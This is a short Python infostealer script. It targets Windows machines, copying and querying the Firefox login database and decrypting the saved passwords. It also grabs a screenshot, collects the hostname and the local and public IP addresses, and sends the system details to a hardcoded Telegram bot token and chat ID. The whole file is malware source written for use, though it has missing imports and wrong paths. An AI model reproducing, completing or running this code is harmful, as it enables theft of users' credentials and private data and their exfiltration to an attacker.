import socket
import requests
from requests import get
from PIL import ImageGrab
import os
import random
import sqlite3



def Firefox_cookies():
   texto = 'Passwords firefox:' + '\n'
   texto += 'URL | LOGIN | PASSWORD' + '\n'
   if os.path.exists(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox'):
       shutil.copy2(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2', os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
       conn = sqlite3.connect(os.getenv("APPDATA") + '\\AppData\\Roaming\\Mozilla\\Firefox2')
       cursor = conn.cursor()
       cursor.execute('SELECT action_url, username_value, password_value FROM logins')
       for result in cursor.fetchall():
           password = win32crypt.CryptUnprotectData(result[2])[1].decode()
           login = result[1]
           url = result[0]
           if password != '':
               texto += url + ' | ' + login + ' | ' + password + '\n'
file = open(os.getenv("APPDATA") + '\\firefox_pass.txt', "w+")
file.write(str(Firefox_cookies()) + '\n')
file.close()





hostname = socket.gethostname()
local_ip = socket.gethostbyname(hostname)
public_ip = get('http://api.ipify.org').text

print(f'host: {hostname}')
print(f'lip: {local_ip}')
print(f'pip: {public_ip}')


randname = f"screen{hostname}-{str(random.randint(111111,999999))}"
screen = ImageGrab.grab()
screen.save(os.getenv("APPDATA") + f'\\{randname}.jpg')

Firefox_cookies()


token = "5701589055:AAHL1gbfBrCO6PFf-wGoOJe9QdQRmUNIC-0"
chat_id = "1104502854"
text = (f"local ip = {local_ip} ,public ip = {public_ip} ,hostname = {hostname} ")
url_req = "https://api.telegram.org/bot" + token + "/sendMessage" + "?chat_id=" + chat_id + "&text=" + text
results = requests.get(url_req)
print(results.json())

